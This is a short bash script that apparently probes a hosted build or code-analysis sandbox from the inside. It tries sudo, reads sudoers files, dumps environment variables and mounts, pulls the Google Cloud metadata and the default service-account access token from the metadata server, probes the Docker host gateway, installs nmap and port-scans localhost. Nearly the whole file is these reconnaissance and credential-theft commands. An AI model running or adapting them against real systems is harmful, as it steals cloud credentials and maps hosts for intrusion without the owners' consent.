#!/bin/bash
# -*- coding: UTF8 -*-
ps -aux
cat /opt/deptrace/sudo-install
sudo id
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1?alt=json&recursive=true'
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
echo /opt/out/snapshot/workspace/lgtm/extract.sh
cat /opt/out/snapshot/workspace/lgtm/extract.sh
echo /opt/deptrace/deptrace
ls -lah /opt/deptrace/deptrace

mount

curl -vv 'http://172.17.0.1/'
curl -vv 'http://172.17.0.1:8443/'

apt-get install nmap
nmap -nvv 127.0.0.1

ls /etc/sudoers.d/
cat /etc/sudoers.d/*

env
echo "/opt search :"
find /opt
